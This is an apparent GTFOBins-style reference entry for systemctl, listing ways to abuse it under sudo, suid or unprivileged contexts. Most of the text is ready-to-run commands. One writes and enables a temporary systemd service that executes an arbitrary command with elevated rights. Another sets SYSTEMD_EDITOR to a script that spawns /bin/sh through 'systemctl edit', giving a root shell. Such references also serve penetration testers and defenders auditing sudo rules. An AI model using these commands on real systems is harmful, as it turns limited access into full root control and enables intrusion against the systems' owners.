title: systemctl
html:
systemctl

Inherit

Context: sudo, suid, unprivileged

systemctl

Shell

Context: sudo, suid

echo '[Service]
Type=oneshot
ExecStart=/path/to/command
[Install]
WantedBy=multi-user.target' >/path/to/temp-file.service
systemctl link /path/to/temp-file.service
systemctl enable --now /path/to/temp-file.service

Context: sudo

echo /bin/sh >/path/to/temp-file
chmod +x /path/to/temp-file
SYSTEMD_EDITOR=/path/to/temp-file systemctl edit basic.target
excerpt: systemctl Inherit Context: sudo, suid, unprivileged systemctl Shell Context: sudo, suid echo '[Service] Type=oneshot ExecStart=/path/to/command [Install] WantedBy=multi-user.target' >/pat
